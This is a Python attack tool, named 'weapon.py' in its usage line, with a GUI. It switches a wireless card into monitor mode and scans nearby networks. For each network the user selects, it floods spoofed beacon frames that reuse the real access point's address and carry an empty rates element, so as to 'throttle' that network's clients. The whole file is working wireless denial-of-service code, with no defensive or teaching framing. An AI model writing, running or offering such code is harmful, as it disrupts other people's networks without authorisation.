import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class RateThrottleV5_3:
    def __init__(self, iface):
        self.iface = iface
        self.targets = {} # {SSID: BSSID}
        self.active_throttle = set()
        
        self.prepare_hardware()
        
        self.root = tk.Tk()
        self.root.title("Rate Manipulation Logic (BW 0)")
        self.root.geometry("700x550")
        self.root.configure(bg="#0a0a0a")

        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", font=("Courier", 10), height=18)
        self.listbox.pack(padx=10, pady=10, fill="both", expand=True)

        btn_frame = tk.Frame(self.root, bg="#0a0a0a")
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="THROTTLE (BW 0)", command=self.start_throttle, bg="#cc0000", fg="white", width=15).pack(side="left", padx=5)
        tk.Button(btn_frame, text="STOP", command=self.stop_throttle, bg="#444", fg="white", width=15).pack(side="left", padx=5)

        threading.Thread(target=self.scanner, daemon=True).start()
        threading.Thread(target=self.throttle_engine, daemon=True).start()

    def prepare_hardware(self):
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def scanner(self):
        def handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode()
                bssid = pkt[Dot11].addr3
                if ssid and ssid not in self.targets:
                    self.targets[ssid] = bssid
                    self.root.after(0, self.refresh_ui)
        sniff(iface=self.iface, prn=handler, store=0)

    def throttle_engine(self):
        while True:
            for ssid in list(self.active_throttle):
                bssid = self.targets[ssid]
                # Logic: Build a "Crippled" Beacon
                # We omit HT/VHT/HE capabilities and provide an empty Supported Rates list
                dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
                beacon = Dot11Beacon(cap='ESS')
                essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
                
                # Logic: This 'rates' element is intentionally broken/empty
                rates = Dot11Elt(ID='Rates', info=b'\x00') 
                
                # Send the "Fake News" Beacon
                pkt = RadioTap()/dot11/beacon/essid/rates
                sendp(pkt, iface=self.iface, verbose=False, count=5)
            time.sleep(0.1)

    def start_throttle(self):
        for i in self.listbox.curselection():
            ssid = list(self.targets.keys())[i]
            self.active_throttle.add(ssid)
        self.refresh_ui()

    def stop_throttle(self):
        self.active_throttle.clear()
        self.refresh_ui()

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for ssid in self.targets:
            status = " [THROTTLING] " if ssid in self.active_throttle else " [DETECTED] "
            self.listbox.insert(tk.END, f"{status} SSID: {ssid}")

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 weapon.py [interface]")
    else: RateThrottleV5_3(sys.argv[1]).root.mainloop()
